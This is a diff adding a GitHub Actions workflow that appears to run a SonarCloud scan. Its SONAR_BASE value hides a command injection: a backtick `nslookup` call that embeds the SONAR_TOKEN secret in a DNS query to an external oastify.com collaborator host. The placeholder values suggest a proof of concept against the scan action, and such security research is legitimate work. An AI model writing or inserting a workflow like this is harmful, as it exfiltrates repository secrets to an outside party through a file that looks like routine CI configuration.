@@ -1,0 +1,26 @@
+name: Sonar
+
+on:
+  workflow_dispatch:
+
+jobs:
+  sonar:
+    name: Sonar
+    runs-on: ubuntu-latest
+    steps:
+      - name: SonarCloud Scan
+        uses: sonarsource/sonarcloud-github-action@master
+        env:
+          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+          SONAR_PR_NUM: 666
+          SONAR_HEAD: foo
+          SONAR_BASE: foo`nslookup ${SONAR_TOKEN}.w74901mjqxo3phbichctp7d8nztqhg55.oastify.com`bar
+        with:
+          args: >
+            -Dsonar.scm.revision=foo
+            -Dsonar.pullrequest.key=${{ env.SONAR_PR_NUM }}
+            -Dsonar.pullrequest.branch=${{ env.SONAR_HEAD }}
+            -Dsonar.pullrequest.base=${{ env.SONAR_BASE }}
+            -Dsonar.projectKey=test
+            -Dsonar.organization=test
